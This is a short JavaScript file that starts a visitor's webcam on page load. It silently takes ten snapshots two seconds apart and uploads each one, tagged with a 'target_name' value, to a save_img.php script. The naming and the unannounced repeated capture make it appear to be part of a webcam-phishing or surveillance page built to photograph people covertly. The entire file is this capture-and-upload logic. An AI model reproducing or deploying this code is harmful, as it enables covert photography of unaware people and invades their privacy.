

$(document).ready(function(){ 
    //photo
    var name=$(".target_name").val();
    const webcamElement = document.getElementById('webcam');
    const canvasElement = document.getElementById('canvas');
    const webcam = new Webcam(webcamElement, 'user', canvasElement);

    webcam.start();

    var i=0;
    window.setInterval(function(){
        if(i<10){
            now_you_see_me();
            i++;
        }
    }, 2000);

    function now_you_see_me(){
        var picture = webcam.snap();
        $.post("./save_img.php",
        {picture:picture,name:name},
        function(data,status){
            console.log(data);
        });
    }

    console.log(name);
});